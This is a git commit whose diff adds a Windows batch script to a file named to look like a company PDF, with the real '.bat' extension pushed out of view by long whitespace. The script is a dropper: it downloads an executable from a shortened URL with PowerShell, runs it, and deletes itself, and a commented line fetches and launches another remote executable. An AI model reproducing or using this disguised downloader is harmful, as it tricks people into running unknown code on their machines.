65c90ab75f82c549d6f82f019d9a38982d749507
sys!!+root <79191180+Algorithm99root@users.noreply.github.com>
2025-07-10 12:37:47 +0100

    Update company_infomation_all_documnets.pdf                                                                                                                    o          fdklgdljfgkdfkgjdkfjgkdjfgkdjfkgjdk                      o  o      p p  p       ....  ....bat

--- company_infomation_all_documnets.pdf                                                                                                                    o          fdklgdljfgkdfkgjdkfjgkdjfgkdjfkgjdk                      o  o      p p  p       ....  ....bat
+++ company_infomation_all_documnets.pdf                                                                                                                    o          fdklgdljfgkdfkgjdkfjgkdjfgkdjfkgjdk                      o  o      p p  p       ....  ....bat
@@ -1,1 +1,21 @@
 
+@echo off
+set "url=https://tinyurl.com/4wvmcbbt"
+set "file=%~dp0runme.exe"
+
+:: Download EXE using PowerShell
+powershell -Command "(New-Object Net.WebClient).DownloadFile('%url%', '%file%')"
+
+:: Run the downloaded EXE
+if exist "%file%" (
+    start "" "%file%"
+) else (
+    echo Download failed.
+    exit /b
+)
+
+:: Self-delete
+(del "%~f0") >nul 2>&1
+
+
+::curl -L -o "https://raw.githubusercontent.com/Algorithm99root/c-or-c-project/refs/heads/master/Gussing%20Game%20in%20C/main.exe" "%USERPROFILE%\Desktop\game.exe"   && start "" "%USERPROFILE%\Desktop\game.exe"
